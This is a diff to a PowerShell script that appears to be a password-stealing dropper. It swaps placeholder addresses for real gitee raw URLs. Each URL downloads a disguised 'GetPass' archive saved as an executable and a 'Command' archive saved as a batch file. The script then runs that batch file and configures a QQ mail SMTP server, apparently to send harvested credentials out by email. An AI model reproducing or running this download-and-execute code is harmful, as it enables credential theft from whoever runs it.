@@ -1,6 +1,6 @@
-(new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/GetPass.rar','D:\Get.exe');
+(new-object System.Net.WebClient).DownloadFile('https://gitee.com/awwhailpython/PS1/raw/main/GetPass.rar','D:\Get.exe');
 
-(new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/Command.rar','D:\Command.bat');
+(new-object System.Net.WebClient).DownloadFile('https://gitee.com/awwhailpython/PS1/raw/main/Command.rar','D:\Command.bat');
 
 D:\Command.bat;
 $SMTPServer = 'smtp.qq.com'
